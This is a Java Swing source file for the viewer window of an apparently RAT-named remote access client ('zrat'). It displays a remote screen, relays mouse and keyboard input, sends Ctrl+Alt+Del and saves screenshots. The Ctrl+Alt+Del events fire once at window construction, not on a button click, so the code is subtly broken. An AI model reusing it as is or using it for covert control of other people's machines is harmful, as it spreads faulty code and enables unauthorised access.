package com.zrat.client.ui;

import java.awt.BorderLayout;
import java.awt.Dimension;
import java.awt.Toolkit;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.KeyEvent;
import java.awt.event.KeyListener;
import java.awt.event.MouseEvent;
import java.awt.event.MouseListener;
import java.awt.event.MouseMotionListener;
import java.awt.event.MouseWheelEvent;
import java.awt.event.MouseWheelListener;
import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;
import java.awt.image.BufferedImage;
import java.io.InputStream;

import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JScrollPane;
import javax.swing.JToolBar;
import javax.swing.SwingConstants;
import javax.swing.WindowConstants;

import com.sun.image.codec.jpeg.JPEGCodec;
import com.sun.image.codec.jpeg.JPEGImageDecoder;
import com.zrat.client.controller.ScreenService;
import com.zrat.client.util.Utils;

/**
 * This code was edited or generated using CloudGarden's Jigloo SWT/Swing GUI
 * Builder, which is free for non-commercial use. If Jigloo is being used
 * commercially (ie, by a corporation, company or business for any purpose
 * whatever) then you should purchase a license for each developer using Jigloo.
 * Please visit www.cloudgarden.com for details. Use of Jigloo implies
 * acceptance of these licensing terms. A COMMERCIAL LICENSE HAS NOT BEEN
 * PURCHASED FOR THIS MACHINE, SO JIGLOO OR THIS CODE CANNOT BE USED LEGALLY FOR
 * ANY CORPORATE OR COMMERCIAL PURPOSE.
 */
public class ScreenFrame extends JFrame implements MouseWheelListener,
		MouseListener, MouseMotionListener {
	/**
	 * 
	 */
	private static final long serialVersionUID = 1L;
	private JToolBar toolBar;
	private JScrollPane jScrollPane;
	private ScreenLabel screenLabel;
	private JButton controlButton;
	private JButton fullButton;
	private JButton keyButton;
	private JButton recordButton;
	private JButton saveButton;
	private ScreenService service;
	private static BufferedImage screen;
	private int cell_width=0;
	private int cell_height=0;
	private boolean isControl = false;
	private boolean isFullScreen = false;
	
	public ScreenFrame(ScreenService service,String title) {
		super();
		this.setTitle(title);
		this.service = service;
		initGUI();
	}

	private void initGUI() {
		try {
			setDefaultCloseOperation(WindowConstants.DISPOSE_ON_CLOSE);
			{
				toolBar = new JToolBar();
				getContentPane().add(toolBar, BorderLayout.NORTH);
				{
					saveButton = new JButton(Utils.createImageIcon("icons/savePictrue_32.png"));
					toolBar.add(saveButton);
					saveButton.setVerticalTextPosition(SwingConstants.BOTTOM);
					saveButton.setHorizontalTextPosition(SwingConstants.CENTER);
					saveButton.setText("\u4fdd\u5b58\u4e3a\u56fe\u7247");
					saveButton.addActionListener(new ActionListener() {
						public void actionPerformed(ActionEvent evt) {
							screenLabel.savePic();
						}
					});
				}
				{
					recordButton = new JButton(Utils.createImageIcon("icons/saveFilm_32.png"));
					toolBar.add(recordButton);
					recordButton.setVerticalTextPosition(SwingConstants.BOTTOM);
					recordButton.setHorizontalTextPosition(SwingConstants.CENTER);
					recordButton.setText("\u5f55\u5236\u4e3a\u89c6\u9891");
				}
				{
					keyButton = new JButton(Utils.createImageIcon("icons/ctrl_alt_del32x32.png"));
					toolBar.add(keyButton);
					keyButton.setVerticalTextPosition(SwingConstants.BOTTOM);
					keyButton.setHorizontalTextPosition(SwingConstants.CENTER);
					keyButton.setText("Ctr+Alt+Del");
					service.sendKey(KeyEvent.KEY_PRESSED, KeyEvent.VK_CONTROL);
					service.sendKey(KeyEvent.KEY_PRESSED, KeyEvent.VK_ALT);
					service.sendKey(KeyEvent.KEY_PRESSED, KeyEvent.VK_DELETE);
					
					service.sendKey(KeyEvent.KEY_RELEASED, KeyEvent.VK_CONTROL);
					service.sendKey(KeyEvent.KEY_RELEASED, KeyEvent.VK_ALT);
					service.sendKey(KeyEvent.KEY_RELEASED, KeyEvent.VK_DELETE);
					
				}
				{
					fullButton = new JButton(Utils.createImageIcon("icons/fullscreen32x32.png"));
					toolBar.add(fullButton);
					fullButton.setVerticalTextPosition(SwingConstants.BOTTOM);
					fullButton.setHorizontalTextPosition(SwingConstants.CENTER);
					fullButton.setText("\u5168\u5c4f\u663e\u793a");
					fullButton.addActionListener(new ActionListener() {
						public void actionPerformed(ActionEvent evt) {
							if (!isFullScreen){
								Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize();     //得到屏幕的尺寸
								setLocation(0, 0);//设置坐标
								setSize(screenSize.width,screenSize.height); 
								fullButton.setText("退出全屏");
								fullButton.setIcon(Utils.createImageIcon("icons/fullscreen_revert32x32.png"));
								isFullScreen = true;
							}else{
								setSize(800,600); 
								fullButton.setText("全屏显示");
								fullButton.setIcon(Utils.createImageIcon("icons/fullscreen32x32.png"));
								isFullScreen = false;
							}
						}
					});
				}
				{
					controlButton = new JButton(Utils.createImageIcon("icons/startControl_32.png"));
					toolBar.add(controlButton);
					controlButton.setVerticalTextPosition(SwingConstants.BOTTOM);
					controlButton.setHorizontalTextPosition(SwingConstants.CENTER);
					controlButton.setText("\u5f00\u59cb\u63a7\u5236");
					controlButton.addActionListener(new ActionListener() {
						public void actionPerformed(ActionEvent evt) {
							if (!isControl){
								startControl();
							}else{
								stopControl();
							}
						}
					});
				}
			}
			{
				jScrollPane = new JScrollPane();
				getContentPane().add(jScrollPane, BorderLayout.CENTER);
				{
					screenLabel = new ScreenLabel();
					jScrollPane.setViewportView(screenLabel);

				}
			}
			this.setLocationRelativeTo(null);
			this.addKeyListener(new KeyListener() {
				
				@Override
				public void keyTyped(KeyEvent arg0) {
					// TODO Auto-generated method stub
					
				}
				
				@Override
				public void keyReleased(KeyEvent arg0) {
					service.sendKey(KeyEvent.KEY_RELEASED, arg0.getKeyCode());
					
				}
				
				@Override
				public void keyPressed(KeyEvent arg0) {
					service.sendKey(KeyEvent.KEY_PRESSED, arg0.getKeyCode());
					
				}
			});
			this.addWindowListener(new WindowAdapter() {
				public void windowClosing(WindowEvent evt) {
					close();
				}
			});
//			setUndecorated(true);
//			GraphicsDevice gd=GraphicsEnvironment.getLocalGraphicsEnvironment().getDefaultScreenDevice();
//			 gd.setFullScreenWindow(this);
			pack();
			this.setSize(800, 600);
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	public void mouseClicked(MouseEvent arg0) {
		process(arg0);
	}

	public void mouseEntered(MouseEvent arg0) {
		process(arg0);
	}

	public void mouseExited(MouseEvent arg0) {
		process(arg0);
	}

	public void mousePressed(MouseEvent arg0) {
		process(arg0);
		service.sendMouse(MouseEvent.MOUSE_PRESSED, arg0.getX(), arg0.getY(),
				arg0.getButton());
	}

	public void mouseReleased(MouseEvent arg0) {
		process(arg0);
		service.sendMouse(MouseEvent.MOUSE_RELEASED, arg0.getX(), arg0.getY(),
				arg0.getButton());
	}

	public void process(MouseEvent e) {
		// if(e.isPopupTrigger()){
		// menu.show(one,e.getX(),e.getY());
		// }
	}
	
	public void refresh(InputStream input){
	    try {
	    	
	    	JPEGImageDecoder decoder = JPEGCodec.createJPEGDecoder(input);
	        //将压缩后的数据存放到图像缓存区
	        BufferedImage image = decoder.decodeAsBufferedImage();
	        screen = image;
	        this.setPreferredSize(new Dimension(image.getWidth(),image.getHeight()));
	        getGraphics().drawImage(screen, 0, 0,this);
	    } catch (Exception e) {
			e.printStackTrace();
		}
//		updateUI();
	}
	
	public synchronized void  refresh(int x,int y,InputStream input){
	    try {
	    	JPEGImageDecoder decoder = JPEGCodec.createJPEGDecoder(input);
	        //将压缩后的数据存放到图像缓存区
	        BufferedImage image = decoder.decodeAsBufferedImage();
	        screen = image;
	        this.setPreferredSize(new Dimension(image.getWidth(),image.getHeight()));
	    	getGraphics().drawImage(image, x *cell_width, y * cell_height, this);
		} catch (Exception e) {
			e.printStackTrace();
		}
//		updateUI();
// updateUI();
	}
	
	public void close(){
		stopControl();
		service.stopSendScreen();
		this.dispose();
		Client.currentServer.setScreenFrame(null);
	}

	public void mouseDragged(MouseEvent e) {
		service.sendMouse(MouseEvent.MOUSE_MOVED, e.getX(), e.getY(), e
				.getButton());
	}

	public void mouseMoved(MouseEvent e) {
		service.sendMouse(MouseEvent.MOUSE_MOVED, e.getX(), e.getY(), e
				.getButton());
	}

	public void mouseWheelMoved(MouseWheelEvent arg0) {
		service.sendMouse(MouseEvent.MOUSE_WHEEL, arg0.getX(), arg0.getY(),
				arg0.getButton());
	}

	public void startControl() {
		isControl = true;
		controlButton.setText("停止控制");
		controlButton.setIcon(Utils.createImageIcon("icons/stopControl_32.png"));
		screenLabel.addMouseListener(this);
		screenLabel.addMouseWheelListener(this);
		screenLabel.addMouseMotionListener(this);
	}

	public void stopControl() {
		isControl = false;
		controlButton.setText("开始控制");
		controlButton.setIcon(Utils.createImageIcon("icons/startControl_32.png"));
		screenLabel.removeMouseListener(this);
		screenLabel.removeMouseWheelListener(this);
		screenLabel.removeMouseMotionListener(this);
	}

	public ScreenLabel getScreenLabel() {
		return screenLabel;
	}

	public void setScreenLabel(ScreenLabel screenLabel) {
		this.screenLabel = screenLabel;
		BorderLayout screenLabelLayout = new BorderLayout();
		screenLabel.setLayout(screenLabelLayout);
	}
	
	public int getCell_width() {
		return cell_width;
	}

	public void setCell_width(int cellWidth) {
		cell_width = cellWidth;
	}

	public int getCell_height() {
		return cell_height;
	}

	public void setCell_height(int cellHeight) {
		cell_height = cellHeight;
	}
	
	public void setScreenSize(int width,int height){
		screen = new BufferedImage(width, height, BufferedImage.TYPE_INT_RGB);
		super.setSize(width, height);
		setPreferredSize(new  Dimension(width, height));
	}

}
